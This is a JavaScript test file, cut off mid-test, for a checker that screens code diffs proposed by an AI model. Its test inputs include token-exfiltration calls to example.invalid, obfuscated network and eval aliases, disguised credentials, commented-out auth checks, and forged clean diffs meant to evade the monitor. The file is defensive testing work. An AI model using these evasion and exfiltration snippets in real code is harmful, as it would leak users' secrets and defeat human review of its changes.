import test from 'node:test';
import assert from 'node:assert/strict';
import { createHash } from 'node:crypto';
import { MODEL_ALLOWED_PATH } from '../aieo/lib/model-provider.mjs';
import { inspectModelDiff } from './aieo-model-security.mjs';

const hash = (value) => createHash('sha256').update(value).digest('hex');
const original = 'const items = 1;\n';
const actual = 'const items = 2;\n';
const report = { status: 'proposed', sourceHash: hash(original), proposedHash: hash(actual) };
const diff = '@@ -1 +1 @@\n-const items = 1;\n+const items = 2;\n';
const input = { original, actual, changedPaths: [MODEL_ALLOWED_PATH], diff, report };


test('Security rejects escaped keys and CR-only secret trivia from actual bytes, not a forged diff', () => {
  const disguised = [
    '\\u0070assword = createValue()',
    "\\x70assword: 'x'",
    'client\\u{53}ecret = createValue()',
    'password // note\r = short',
    'config["apiKey"] // note\r= short'
  ];
  for (const marker of disguised) {
    const candidate = 'const items = 2;\n' + marker + '\n';
    const verdict = inspectModelDiff({
      original, actual: candidate, changedPaths: [MODEL_ALLOWED_PATH],
      diff: '@@ -1 +1 @@\n-const items = 1;\n+const items = 2;\n',
      report: { status: 'proposed', sourceHash: hash(original), proposedHash: hash(candidate) }
    });
    assert.equal(verdict.status, 'failed');
    assert.ok(verdict.findings.includes('Potentially unsafe new code'));
    assert.equal(JSON.stringify(verdict).includes(marker), false);
  }
  const safe = 'const items = 2; // تحسين الواجهة\n';
  assert.equal(inspectModelDiff({
    original, actual: safe, changedPaths: [MODEL_ALLOWED_PATH],
    diff: '@@ -1 +1 @@\n-const items = 1;\n+const items = 2; // تحسين الواجهة\n',
    report: { status: 'proposed', sourceHash: hash(original), proposedHash: hash(safe) }
  }).status, 'passed');
});

test('independent Security rejects computed secret keys in actual bytes with forged clean diff', () => {
  for (const marker of [
    'config["password"] = createSecret()',
    "settings['clientSecret' /* note */ ] = short",
    "config[\x60apiKey\x60] = 'x'",
    'const cfg = { ["privateKey"]: "x" }',
    'config[session_token] /* note */ = makeValue()',
    'cfg["access_token" /* note */ ] = "short"'
  ]) {
    const candidate = 'const items = 2;\n' + marker + '\n';
    const verdict = inspectModelDiff({
      original, actual: candidate, changedPaths: [MODEL_ALLOWED_PATH],
      diff: '@@ -1 +1 @@\n-const items = 1;\n+const items = 2;\n',
      report: {
        status: 'proposed', sourceHash: hash(original),
        proposedHash: hash(candidate)
      }
    });
    assert.equal(verdict.status, 'failed');
    assert.ok(verdict.findings.includes('Potentially unsafe new code'));
    assert.equal(JSON.stringify(verdict).includes(marker), false, 'never echo credentials');
  }
  const safe = 'const items = 2; // تحسين الواجهة\n';
  assert.equal(inspectModelDiff({
    original, actual: safe, changedPaths: [MODEL_ALLOWED_PATH],
    diff: '@@ -1 +1 @@\n-const items = 1;\n+const items = 2; // تحسين الواجهة\n',
    report: { status: 'proposed', sourceHash: hash(original), proposedHash: hash(safe) }
  }).status, 'passed');
});

test('independent Security finds comment-separated sensitive assignments in actual candidate, not a forged diff', () => {
  const disguised = [
    'password // audit comment\n = short',
    '"api.key" // audit comment\n: "x"',
    'clientSecret /* first */ /* second */ = makeValue()',
    'session_token /* ' + 'x'.repeat(320) + ' */ = createToken()',
    'privateKey /* note */ // second note\n = getValue()'
  ];
  for (const marker of disguised) {
    const candidate = 'const items = 2; // harmless\n' + marker + '\n';
    const verdict = inspectModelDiff({
      original, actual: candidate, changedPaths: [MODEL_ALLOWED_PATH],
      // The diff is intentionally misleading; Security must inspect actual file bytes.
      diff: '@@ -1 +1 @@\n-const items = 1;\n+const items = 2;\n',
      report: {
        status: 'proposed', sourceHash: hash(original),
        proposedHash: hash(candidate)
      }
    });
    assert.equal(verdict.status, 'failed');
    assert.ok(verdict.findings.includes('Potentially unsafe new code'));
    assert.equal(JSON.stringify(verdict).includes(marker), false, 'never echo credentials');
  }
  const safe = 'const items = 2; // تحديث عام\n';
  assert.equal(inspectModelDiff({
    original, actual: safe, changedPaths: [MODEL_ALLOWED_PATH],
    diff: '@@ -1 +1 @@\n-const items = 1;\n+const items = 2; // تحديث عام\n',
    report: {
      status: 'proposed', sourceHash: hash(original), proposedHash: hash(safe)
    }
  }).status, 'passed');
});

test('independent Security rejects short explicit secrets from actual bytes despite forged diff', () => {
  const markers = [
    '{"password":"1234"}',
    '{"client_secret":"abc123"}',
    '{"privateKey":"k"}',
    '{"api.key":"x"}',
    '?access_token=abc',
    '{"sessionToken":"xy"}'
  ];
  for (const marker of markers) {
    const candidate = 'const items = 2; // ' + marker + '\n';
    const verdict = inspectModelDiff({
      original, actual: candidate, changedPaths: [MODEL_ALLOWED_PATH],
      // Intentionally unrelated Git diff: actual candidate content is authoritative.
      diff: '@@ -1 +1 @@\n-const items = 1;\n+const items = 2;\n',
      report: { status: 'proposed', sourceHash: hash(original), proposedHash: hash(candidate) }
    });
    assert.equal(verdict.status, 'failed');
    assert.ok(verdict.findings.includes('Potentially unsafe new code'));
    assert.equal(JSON.stringify(verdict).includes(marker), false, 'redacted finding only');
  }
  const safe = 'const items = 2; // public label\n';
  assert.equal(inspectModelDiff({
    original, actual: safe, changedPaths: [MODEL_ALLOWED_PATH],
    diff: '+const items = 2; // public label',
    report: { status: 'proposed', sourceHash: hash(original), proposedHash: hash(safe) }
  }).status, 'passed');
});

test('independent Security catches percent-encoded secrets in actual candidate despite forged diff', () => {
  for (const marker of [
    '?access%5Ftoken=syntheticvalue123456',
    '"client%2Esecret": "synthetic_value_987654321"',
    '?%61pi_key=syntheticvalue123456',
    '?access%255Ftoken=syntheticvalue123456',
    '?access%25255Ftoken=syntheticvalue123456',
    '"ｃｌｉｅｎｔ％２Ｅｓｅｃｒｅｔ": "synthetic_value_987654321"'
  ]) {
    const candidate = 'const items = 2; // ' + marker + '\n';
    const verdict = inspectModelDiff({
      original, actual: candidate, changedPaths: [MODEL_ALLOWED_PATH],
      diff: '@@ -1 +1 @@\n-const items = 1;\n+const items = 2;\n',
      report: {
        status: 'proposed', sourceHash: hash(original),
        proposedHash: hash(candidate)
      }
    });
    assert.equal(verdict.status, 'failed');
    assert.ok(verdict.findings.includes('Potentially unsafe new code'));
  }
  const safe = 'const items = 2; // تحديث نص الواجهة\n';
  assert.equal(inspectModelDiff({
    original, actual: safe, changedPaths: [MODEL_ALLOWED_PATH],
    diff: '@@ -1 +1 @@\n-const items = 1;\n+const items = 2; // تحديث نص الواجهة\n',
    report: {
      status: 'proposed', sourceHash: hash(original), proposedHash: hash(safe)
    }
  }).status, 'passed');
});

test('independent Security re-reads actual changed bytes and rejects NFKC-disguised credentials', () => {
  const markers = [
    '"ａｐｉ＿ｋｅｙ": "synthetic_value_987654321"',
    '"ｃｌｉｅｎｔ．ｓｅｃｒｅｔ": "synthetic_value_987654321"',
    'Ｂｅａｒｅｒ synthetic_value_987654321'
  ];
  for (const marker of markers) {
    const candidate = 'const items = 2; // ' + marker + '\n';
    const verdict = inspectModelDiff({
      original, actual: candidate, changedPaths: [MODEL_ALLOWED_PATH],
      // Untrusted diff is forged clean: the reviewer must use actual candidate.
      diff: '@@ -1 +1 @@\n-const items = 1;\n+const items = 2;\n',
      report: { status: 'proposed', sourceHash: hash(original),
        proposedHash: hash(candidate) }
    });
    assert.equal(verdict.status, 'failed');
    assert.ok(verdict.findings.includes('Potentially unsafe new code'));
  }
  const safe = 'const items = 2; // تحسين الواجهة\n';
  assert.equal(inspectModelDiff({
    original, actual: safe, changedPaths: [MODEL_ALLOWED_PATH],
    diff: '@@ -1 +1 @@\n-const items = 1;\n+const items = 2; // تحسين الواجهة\n',
    report: { status: 'proposed', sourceHash: hash(original),
      proposedHash: hash(safe) }
  }).status, 'passed');
});

test('independent Security rejects private-use and unassigned Unicode in actual diff', () => {
  for (const marker of ['\uE000', '\uFDD0', '\uFFFF']) {
    const candidate = 'const items = 2; // status ' + marker + '\n';
    const verdict = inspectModelDiff({
      original, actual: candidate, changedPaths: [MODEL_ALLOWED_PATH],
      diff: '@@ -1 +1 @@\n-const items = 1;\n+' + candidate,
      report: { status: 'proposed', sourceHash: hash(original), proposedHash: hash(candidate) }
    });
    assert.equal(verdict.status, 'failed');
    assert.ok(verdict.findings.includes('Potentially unsafe new code'));
  }
  const safe = 'const items = 2; // الحالة\n';
  assert.equal(inspectModelDiff({
    original, actual: safe, changedPaths: [MODEL_ALLOWED_PATH],
    diff: '@@ -1 +1 @@\n-const items = 1;\n+' + safe,
    report: { status: 'proposed', sourceHash: hash(original), proposedHash: hash(safe) }
  }).status, 'passed');
});

test('independent Security rejects non-printing line controls in actual diff', () => {
  for (const control of ['\u2028', '\u2029', '\u0085', '\u0000']) {
    const candidate = 'const items = 2; // status' + control + 'boundary;\n';
    const verdict = inspectModelDiff({
      original, actual: candidate, changedPaths: [MODEL_ALLOWED_PATH],
      diff: '@@ -1 +1 @@\n-const items = 1;\n+' + candidate,
      report: { status: 'proposed', sourceHash: hash(original),
        proposedHash: hash(candidate) }
    });
    assert.equal(verdict.status, 'failed');
    assert.ok(verdict.findings.includes('Potentially unsafe new code'));
  }
  const safe = 'const items = 2; // حالة الواجهة\n';
  assert.equal(inspectModelDiff({
    original, actual: safe, changedPaths: [MODEL_ALLOWED_PATH],
    diff: '@@ -1 +1 @@\n-const items = 1;\n+' + safe,
    report: { status: 'proposed', sourceHash: hash(original),
      proposedHash: hash(safe) }
  }).status, 'passed');
});

test('independent security accepts one exact clean change', () => {
  assert.equal(inspectModelDiff(input).status, 'passed');
});
test('security blocks changed-file scope and hash tampering', () => {
  assert.equal(inspectModelDiff({ ...input, changedPaths: ['supabase/config.toml'] }).status, 'failed');
  assert.equal(inspectModelDiff({ ...input, changedPaths: [MODEL_ALLOWED_PATH, 'package.json'] }).status, 'failed');
  assert.equal(inspectModelDiff({ ...input, report: { ...report, proposedHash: 'wrong' } }).status, 'failed');
});
test('security blocks suspicious newly introduced calls and credentials', () => {
  assert.equal(inspectModelDiff({ ...input, diff: '+fetch("https://example.invalid")' }).status, 'failed');
  assert.equal(inspectModelDiff({ ...input, diff: '+ghp_' + 'a'.repeat(30) }).status, 'failed');
});
test('security blocks no-op and massive diffs', () => {
  assert.equal(inspectModelDiff({ ...input, actual: original }).status, 'failed');
  assert.equal(inspectModelDiff({ ...input, diff: '+safe\n'.repeat(25) }).status, 'failed');
});

test('security rejects browser exfiltration primitives and modern credentials', () => {
  for (const addition of [
    '+const raw = document.cookie;',
    '+localStorage.getItem("token");',
    '+new WebSocket("wss://example.invalid");',
    '+<div dangerouslySetInnerHTML={{ __html: message }} />;',
    '+import { execSync } from "child_process";',
    '+sk-or-v1-' + 'a'.repeat(40),
    '+github_pat_' + 'b'.repeat(40),
    '+Bearer ' + 'c'.repeat(36)
  ]) {
    assert.equal(inspectModelDiff({ ...input, diff: addition }).status, 'failed', addition);
  }
});

test('security rejects browser side-channel exfiltration and navigation additions', () => {
  for (const addition of [
    '+window.open("https://example.invalid/?data=" + token);',
    '+navigator["sendBeacon"]("https://example.invalid", body);',
    '+const pixel = new Image();',
    '+location.assign("https://example.invalid");',
    '+window.location.href = "https://example.invalid";',
    '+document.createElement("iframe");',
    '+globalThis["fetch"]("https://example.invalid");'
  ]) {
    assert.equal(inspectModelDiff({ ...input, diff: addition }).status, 'failed', addition);
  }
});

test('security rejects newly added outbound markup and CSS, including multiline JSX', () => {
  for (const addition of [
    '+<img src={unsafeUrl} />',
    '+<a href={unsafeUrl}>Open</a>',
    '+<form action={unsafeUrl}>Send</form>',
    '+<iframe\n+ src={unsafeUrl} />',
    '+const style = { backgroundImage: \`url(https://example.invalid/\${token})\` };'
  ]) {
    assert.equal(inspectModelDiff({ ...input, diff: addition }).status, 'failed', addition);
  }
});

test('security refuses removal of existing feedback authentication and ownership guards', () => {
  const protectedSource = [
    'const auth = await supabase.auth.getUser();',
    'if (!auth.user) return;',
    'const record = { created_by: auth.user.id };',
    'await supabase.from("feedback").insert(record);',
    ''
  ].join('\n');
  const variants = [
    protectedSource.replace('if (!auth.user)', 'if (true)'),
    protectedSource.replace('created_by: auth.user.id', 'created_by: null'),
    protectedSource.replace('await supabase.auth.getUser()', 'Promise.resolve(null)')
  ];
  for (const current of variants) {
    const evidence = {
      status: 'proposed', sourceHash: hash(protectedSource), proposedHash: hash(current)
    };
    const result = inspectModelDiff({
      original: protectedSource, actual: current, changedPaths: [MODEL_ALLOWED_PATH],
      diff: '@@ -1 +1 @@\n+const safe = 1;\n', report: evidence
    });
    assert.equal(result.status, 'failed');
    assert.ok(result.findings.some((value) => value.includes('authentication or ownership')));
  }
});

test('security freezes submit handler against comment-only auth bypass while allowing UI text edits', () => {
  const base = [
    'export default function FeedbackWidget() {',
    '  async function submit(event: FormEvent<HTMLFormElement>) {',
    '    const { data: auth } = await supabase.auth.getUser();',
    '    if (!auth.user) { return; }',
    '    await supabase.from("feedback").insert({ created_by: auth.user.id });',
    '  }',
    '  return <>',
    '    <form onSubmit={submit}><span>Old label</span></form>',
    '  </>;',
    '}',
    ''
  ].join(String.fromCharCode(10));
  const assess = (actual, diff) => inspectModelDiff({
    original: base, actual, changedPaths: [MODEL_ALLOWED_PATH], diff,
    report: { status: 'proposed', sourceHash: hash(base), proposedHash: hash(actual) }
  });
  const safe = base.replace('Old label', 'New label');
  assert.equal(assess(safe, '+    <form onSubmit={submit}><span>New label</span></form>').status, 'passed');
  // The old substring-only guard accepted commented-out auth checks.
  const commented = base.replace('    if (!auth.user)', '    // if (!auth.user)');
  const commentResult = assess(commented, '+    // if (!auth.user) { return; }');
  assert.equal(commentResult.status, 'failed');
  assert.ok(commentResult.findings.some((finding) => finding.includes('submit handler')));
  const reassigned = base.replace('<form onSubmit={submit}>', '<form onSubmit={() => {}}>');
  assert.equal(assess(reassigned, '+    <form onSubmit={() => {}}><span>Old label</span></form>').status, 'failed');
  const blockComment = base.replace('    if (!auth.user)', '    /* if (!auth.user)');
  assert.equal(assess(blockComment, '+    /* if (!auth.user) { return; }').status, 'failed');
});

test('independent security rejects concealed long or quote-terminated JSX outbound attributes', () => {
  const attempts = [
    '<img ' + ' '.repeat(380) + ' src={unsafeUrl} />',
    '<img title=">" src={unsafeUrl} />',
    '<form title=">" ' + ' '.repeat(375) + ' action={unsafeUrl}>Send</form>'
  ];
  for (const addition of attempts) {
    const result = inspectModelDiff({ ...input, diff: '+' + addition });
    assert.equal(result.status, 'failed',
      'independent security must reject attribute hidden past spacing or a quoted >');
    assert.ok(result.findings.includes('Potentially unsafe new code'));
  }
});


test('independent security rejects alternate JSX network sinks, spread props and image-set', () => {
  const additions = [
    '<input type="image" src={unsafeUrl} />',
    '<button formAction={unsafeUrl}>Send</button>',
    '<svg><image href={unsafeUrl} /></svg>',
    '<svg><use xlinkHref={unsafeUrl} /></svg>',
    '<meta httpEquiv="refresh" content={unsafeUrl} />',
    '<base href={unsafeUrl} />',
    '<video poster={unsafeUrl} />',
    '<track src={unsafeUrl} />',
    '<link imageSrcSet={unsafeUrl} />',
    '<img {...remoteProps} />',
    '<img {...{ src: unsafeUrl }} />',
    '<img\n+  {...remoteProps}\n+/>',
    'const style = { background: image-set("https://example.invalid/track" 1x) };',
    'const style = { background: -webkit-image-set("https://example.invalid/track" 1x) };'
  ];
  for (const addition of additions) {
    const result = inspectModelDiff({ ...input, diff: '+' + addition });
    assert.equal(result.status, 'failed', addition);
    assert.ok(result.findings.includes('Potentially unsafe new code'));
  }
  assert.equal(inspectModelDiff({ ...input, diff: '+<img alt="decorative" />' }).status, 'passed');
});

test('independent Security rejects direct and computed browser location redirects', () => {
  const redirects = [
    'window.location = unsafeUrl;',
    'globalThis["location"] = unsafeUrl;',
    'self?.location = unsafeUrl;',
    'parent.location = unsafeUrl;',
    'document["location"].href = unsafeUrl;',
    'location = unsafeUrl;',
    'window?.["location"] = unsafeUrl;'
  ];
  for (const addition of redirects) {
    const result = inspectModelDiff({ ...input, diff: '+' + addition });
    assert.equal(result.status, 'failed', addition);
    assert.ok(result.findings.includes('Potentially unsafe new code'));
  }
  assert.equal(inspectModelDiff({ ...input, diff: '+const locationLabel = "Current status";' }).status, 'passed');
});


test('independent Security blocks optional browser network calls and EventSource', () => {
  const attempts = [
    "fetch?.(\"https://example.invalid/?data=\" + token);",
    "window?.open?.(\"https://example.invalid/?data=\" + token);",
    "globalThis?.[\"fetch\"]?.(\"https://example.invalid/?data=\" + token);",
    "navigator?.sendBeacon?.(\"https://example.invalid\", body);",
    "navigator?.[\"sendBeacon\"]?.(\"https://example.invalid\", body);",
    "self?.WebSocket?.(\"wss://example.invalid\");",
    "new EventSource(\"https://example.invalid/stream\");",
    "document?.createElement?.(\"iframe\");"
];
  for (const addition of attempts) {
    const result = inspectModelDiff({ ...input, diff: '+' + addition });
    assert.equal(result.status, 'failed', addition);
    assert.ok(result.findings.includes('Potentially unsafe new code'));
  }
  assert.equal(inspectModelDiff({ ...input, diff: '+const networkStatusLabel = "Ready";' }).status, 'passed');
});

test('independent Security blocks indirect network calls and Reflect invocation', () => {
  const attempts = [
    'fetch.call(globalThis, "https://example.invalid/?data=" + token);',
    'navigator.sendBeacon.apply(navigator, ["https://example.invalid", data]);',
    'globalThis["fetch"]["call"](globalThis, unsafeUrl);',
    'Reflect.apply(fetch, globalThis, [unsafeUrl]);',
    'Reflect.construct(WebSocket, ["wss://example.invalid"]);',
    'new WebSocket("wss://example.invalid");',
    'importScripts("https://example.invalid/remote.js");'
  ];
  for (const addition of attempts) {
    const verdict = inspectModelDiff({ ...input, diff: '+' + addition });
    assert.equal(verdict.status, 'failed', addition);
    assert.ok(verdict.findings.includes('Potentially unsafe new code'), addition);
  }
  assert.equal(inspectModelDiff({ ...input, diff: '+const label = "Safe local status";' }).status, 'passed');
});

test('independent Security rejects aliased transports and dynamic-code invokers', () => {
  const attempts = [
    "const sender = fetch; sender(unsafeUrl);",
    "const sender = globalThis[\"fetch\"]; sender(unsafeUrl);",
    "const { sendBeacon: beacon } = navigator; beacon(unsafeUrl, body);",
    "const SocketCtor = WebSocket; new SocketCtor(unsafeUrl);",
    "const PixelCtor = Image; new PixelCtor().src = unsafeUrl;",
    "const opener = globalThis[\"open\"]; opener(unsafeUrl);",
    "const maker = document.createElement; maker(\"img\").src = unsafeUrl;",
    "const remote = Reflect[\"apply\"](fetch, globalThis, [unsafeUrl]);",
    "const WorkerCtor = SharedWorker; new WorkerCtor(unsafeUrl);",
    "const load = importScripts; load(unsafeUrl);",
    "const remoteModule = import(unsafeUrl);",
    "const run = eval; run(unsafeCode);",
    "const codeConstructor = Function; codeConstructor(unsafeCode)();"
  ];
  for (const addition of attempts) {
    const verdict = inspectModelDiff({ ...input, diff: '+' + addition });
    assert.equal(verdict.status, 'failed', addition);
    assert.ok(verdict.findings.includes('Potentially unsafe new code'), addition);
  }
  assert.equal(inspectModelDiff({ ...input, diff: '+' + "  const fetchStatus = \"local\"; const imageLabel = \"Decorative\";" }).status, 'passed');
});

test('independent Security blocks dynamically resolved browser globals', () => {
  const attempts = [
    "const sender = globalThis['fe' + 'tch']; sender(unsafeUrl);",
    "const opener = window?.['op' + 'en']; opener(unsafeUrl);",
    "navigator['send' + 'Beacon'](unsafeUrl, data);",
    "document['create' + 'Element']('img').src = unsafeUrl;",
    "self['loc' + 'ation'] = unsafeUrl;",
    "const SocketCtor = Reflect.get(globalThis, 'Web' + 'Socket'); new SocketCtor(unsafeUrl);"
];
  for (const addition of attempts) {
    const verdict = inspectModelDiff({ ...input, diff: '+' + addition });
    assert.equal(verdict.status, 'failed', addition);
    assert.ok(verdict.findings.includes('Potentially unsafe new code'), addition);
  }
  assert.equal(inspectModelDiff({ ...input,
    diff: '+const localStatus = "Ready";' }).status, 'passed');
});

test('independent Security rejects aliases of ambient globals and computed sinks', () => {
  const attempts = [
    "const root = globalThis; root['fe' + 'tch'](unsafeUrl);",
    "const root = window; root['loc' + 'ation'] = unsafeUrl;",
    "const host = navigator; host['send' + 'Beacon'](unsafeUrl, data);",
    "const scope = self; scope['op' + 'en'](unsafeUrl);",
    "const scope = global; scope['fe' + 'tch'](unsafeUrl);",
    "const dest = location; dest['ass' + 'ign'](unsafeUrl);",
    "const frameSet = frames; frameSet[0]['loc' + 'ation'] = unsafeUrl;",
    "const scope = this; scope['fe' + 'tch'](unsafeUrl);"
  ];
  for (const addition of attempts) {
    const verdict = inspectModelDiff({ ...input, diff: '+' + addition });
    assert.equal(verdict.status, 'failed', addition);
    assert.ok(verdict.findings.includes('Potentially unsafe new code'), addition);
  }
  for (const addition of [
    'const windowStatus = "Ready";',
    'const locationLabel = "Current status";'
  ]) {
    assert.equal(inspectModelDiff({ ...input, diff: '+' + addition }).status, 'passed', addition);
  }
});

test('independent Security refuses AWS temporary IDs and cloud account key material', () => {
  const cloudMarkers = [
    'ASIA' + 'Z'.repeat(16),
    'AWS_SECRET_ACCESS_KEY = "' + 's'.repeat(40) + '"',
    'AccountKey="' + 'A'.repeat(44) + '"'
  ];
  for (const marker of cloudMarkers) {
    const verdict = inspectModelDiff({ ...input, diff: '+const synthetic = ' + marker + ';' });
    assert.equal(verdict.status, 'failed', 'Security must reject ' + marker.slice(0, 8));
    assert.ok(verdict.findings.includes('Potentially unsafe new code'));
  }
});

test('independent Security refuses signed URL and SaaS token disclosure', () => {
  const markers = [
    '?X-Amz-Signature=' + 'a'.repeat(64),
    '&X-Amz-Credential=' + 'X'.repeat(40),
    '?sv=2023-11-03&sig=' + 'A'.repeat(44),
    'xoxb-' + '1'.repeat(18) + '-' + 'a'.repeat(16),
    'AIza' + 'a'.repeat(35)
  ];
  for (const marker of markers) {
    const result = inspectModelDiff({ ...input, diff: '+const sensitive = "' + marker + '";' });
    assert.equal(result.status, 'failed', marker);
    assert.ok(result.findings.includes('Potentially unsafe new code'), marker);
  }
  assert.equal(inspectModelDiff({
    ...input, diff: '+const signatureStatus = "Pending";'
  }).status, 'passed');
});


test('independent Security rejects unprefixed JWT-shaped credentials', () => {
  // Synthetic bytes, not a functional bearer token.
  const jwt = 'eyJ' + 'A'.repeat(18) + '.' + 'eyJ' + 'B'.repeat(24) + '.' + 'C'.repeat(32);
  const blocked = inspectModelDiff({ ...input, diff: '+const value = "' + jwt + '";' });
  assert.equal(blocked.status, 'failed');
  assert.ok(blocked.findings.includes('Potentially unsafe new code'));
  assert.equal(inspectModelDiff({
    ...input, diff: '+const status = "Authenticated locally";'
  }).status, 'passed');
});


test('independent Security rejects encoded JavaScript globals and call targets', () => {
  const attempts = [
    String.raw`const sender = \u0066etch; sender(unsafeUrl);`,
    String.raw`const root = \u0067lobalThis; root['fe' + 'tch'](unsafeUrl);`,
    String.raw`const root = \u{67}lobalThis; root['fe' + 'tch'](unsafeUrl);`,
    String.raw`const sender = \u0067lobalThis['\x66etch']; sender(unsafeUrl);`
  ];
  for (const addition of attempts) {
    const verdict = inspectModelDiff({ ...input, diff: '+' + addition });
    assert.equal(verdict.status, 'failed', addition);
    assert.ok(verdict.findings.includes('Potentially unsafe new code'), addition);
  }
  assert.equal(inspectModelDiff({
    ...input, diff: '+const label = "Locally rendered status";'
  }).status, 'passed');
});


test('independent Security rejects added unquoted key assignments', () => {
  const markers = [
    'AWS_SECRET_ACCESS_KEY=' + 'x'.repeat(40),
    'AccountKey=' + 'A'.repeat(48) + '==',
    'client_secret:' + 'b'.repeat(36),
    'api_key=' + 'c'.repeat(30),
    'password=' + 'd'.repeat(25),
    'service_role=' + 'e'.repeat(32)
  ];
  for (const marker of markers) {
    const result = inspectModelDiff({
      ...input, diff: '+const field = "' + marker + '";'
    });
    assert.equal(result.status, 'failed', marker);
    assert.ok(result.findings.includes('Potentially unsafe new code'), marker);
  }
  assert.equal(inspectModelDiff({ ...input, diff: '+const displayLabel = "Ready";' }).status, 'passed');
});

test('independent Security rejects constructor and prototype reflection', () => {
  const additions = [
    'const execute = [].filter.constructor("return 42")();',
    'const execute = ({})["constructor"]["constructor"]("return 42")();',
    'const proto = obj.__proto__;',
    'const proto = Object.getPrototypeOf(obj);',
    'Object.setPrototypeOf(obj, other);',
    'Object.defineProperty(obj, "code", { value: 1 });'
  ];
  for (const addition of additions) {
    const verdict = inspectModelDiff({ ...input, diff: '+' + addition });
    assert.equal(verdict.status, 'failed', addition);
    assert.ok(verdict.findings.includes('Potentially unsafe new code'), addition);
  }
  assert.equal(inspectModelDiff({ ...input,
    diff: '+const label = "Local UI status";' }).status, 'passed');
});

test('independent Security blocks invisible Unicode in actual candidate additions', () => {
  const assess = (candidate) => inspectModelDiff({
    original, actual: candidate, changedPaths: [MODEL_ALLOWED_PATH],
    diff: '@@ -1 +1 @@\n-const items = 1;\n+' + candidate,
    report: { status: 'proposed', sourceHash: hash(original),
      proposedHash: hash(candidate) }
  });
  // This is an independent review of the committed diff, not a validation of
  // the earlier model response. An altered candidate must fail closed too.
  for (const invisible of ['\u200B', '\u200D', '\u200E', '\u2060', '\uFEFF']) {
    const candidate = 'const items = 2; // display' + invisible + 'status;\n';
    const verdict = assess(candidate);
    assert.equal(verdict.status, 'failed', 'invisible candidate must be rejected');
    assert.ok(verdict.findings.includes('Potentially unsafe new code'));
  }
  assert.equal(assess('const items = 2; // حالة العرض\n').status, 'passed',
    'normal Arabic display text remains permissible');
});

test('independent Security fails closed on HTML injection and srcDoc in committed diff', () => {
  const sinks = [
    '<div dangerouslySetInnerHTML={{ __html: unsafeHtml }} />',
    '<iframe srcDoc={unsafeHtml} />',
    'const frameProps = { srcDoc: unsafeHtml };',
    'node.insertAdjacentHTML("beforeend", unsafeHtml);',
    'const parsed = new DOMParser();',
    'node.innerHTML = unsafeHtml;',
    'node.outerHTML = unsafeHtml;'
  ];
  for (const line of sinks) {
    const candidate = 'const items = 2;\n' + line + '\n';
    const reviewed = inspectModelDiff({
      original, actual: candidate,
      changedPaths: [MODEL_ALLOWED_PATH],
      diff: '@@ -1 +1,2 @@\n-const items = 1;\n+const items = 2;\n+' + line + '\n',
      report: { status: 'proposed', sourceHash: hash(original), proposedHash: hash(candidate) }
    });
    assert.equal(reviewed.status, 'failed', line);
    assert.ok(reviewed.findings.includes('Potentially unsafe new code'));
  }
  const safeCandidate = 'const items = 2; // harmless display change\n';
  const safe = inspectModelDiff({
    original, actual: safeCandidate,
    changedPaths: [MODEL_ALLOWED_PATH],
    diff: '@@ -1 +1 @@\n-const items = 1;\n+const items = 2; // harmless display change\n',
    report: { status: 'proposed', sourceHash: hash(original), proposedHash: hash(safeCandidate) }
  });
  assert.equal(safe.status, 'passed');
});

test('independent Security screens actual candidate bytes even with an incomplete supplied diff', () => {
  const allegedSafeDiff = '@@ -1 +1 @@\\n-const items = 1;\\n+const items = 2;\\n'.replaceAll('\\n', '\n');
  const candidates = [
    'const items = 2;\nnode.innerHTML = untrustedMarkup;\n',
    'const items = 2;\nconst reply = fetch("/outbound");\n',
    'const items = 2;\nconst target = window.location;\n'
  ];
  for (const candidate of candidates) {
    const verdict = inspectModelDiff({
      original, actual: candidate, changedPaths: [MODEL_ALLOWED_PATH],
      diff: allegedSafeDiff,
      report: { status: 'proposed', sourceHash: hash(original), proposedHash: hash(candidate) }
    });
    assert.equal(verdict.status, 'failed', 'unsafe actual bytes cannot be hidden by a clean diff');
    assert.ok(verdict.findings.includes('Potentially unsafe new code'));
  }
  const safeCandidate = 'const items = 2; // benign presentation change\n';
  assert.equal(inspectModelDiff({
    original, actual: safeCandidate, changedPaths: [MODEL_ALLOWED_PATH],
    diff: allegedSafeDiff,
    report: { status: 'proposed', sourceHash: hash(original), proposedHash: hash(safeCandidate) }
  }).status, 'passed');
});

test('independent Security bounds actual changed lines despite a truncated diff', () => {
  const candidate = 'const items = 2;\n' +
    Array.from({ length: 22 }, (_, index) => 'const label' + index + ' = "' + index + '";').join('\n') + '\n';
  const verdict = inspectModelDiff({
    original, actual: candidate, changedPaths: [MODEL_ALLOWED_PATH],
    diff: '@@ -1 +1 @@\n-const items = 1;\n+const items = 2;\n',
    report: { status: 'proposed', sourceHash: hash(original), proposedHash: hash(candidate) }
  });
  assert.equal(verdict.status, 'failed');
  assert.ok(verdict.findings.includes('Too many new code lines'));
});

test('independent Security catches dangerous token completed by one-character edit', () => {
  const before = 'const reply = feXch("/outbound");\n';
  const after = 'const reply = fetch("/outbound");\n';
  const verdict = inspectModelDiff({
    original: before, actual: after, changedPaths: [MODEL_ALLOWED_PATH],
    diff: '@@ -1 +1 @@\n-const reply = feXch("/outbound");\n+const reply = fetch("/outbound");\n',
    report: { status: 'proposed', sourceHash: hash(before), proposedHash: hash(after) }
  });
  assert.equal(verdict.status, 'failed');
  assert.ok(verdict.findings.includes('Potentially unsafe new code'));
});

test('independent Security rejects block-comment delimiters hidden by a truncated diff', () => {
  const claimedDiff = '@@ -1 +1 @@\n-const items = 1;\n+const items = 2;\n';
  for (const candidate of [
    'const items = 2;\n/* hidden disabled code */\n',
    'const items = 2;\nconst marker = "*/";\n'
  ]) {
    const verdict = inspectModelDiff({
      original, actual: candidate, changedPaths: [MODEL_ALLOWED_PATH],
      diff: claimedDiff,
      report: { status: 'proposed', sourceHash: hash(original), proposedHash: hash(candidate) }
    });
    assert.equal(verdict.status, 'failed', 'candidate comment delimiters cannot be hidden by a clean diff');
    assert.ok(verdict.findings.includes('New block-comment delimiters are not allowed in model changes'));
  }
  const clean = 'const items = 2; // harmless presentation edit\n';
  assert.equal(inspectModelDiff({
    original, actual: clean, changedPaths: [MODEL_ALLOWED_PATH],
    diff: claimedDiff,
    report: { status: 'proposed', sourceHash: hash(original), proposedHash: hash(clean) }
  }).status, 'passed');
});

test('independent Security checks completed block-comment tokens after a one-byte edit', () => {
  const before = 'const marker = "/X";\n';
  const after = 'const marker = "/*";\n';
  const verdict = inspectModelDiff({
    original: before, actual: after, changedPaths: [MODEL_ALLOWED_PATH],
    diff: '@@ -1 +1 @@\n-const marker = "/X";\n+const marker = "/X";\n',
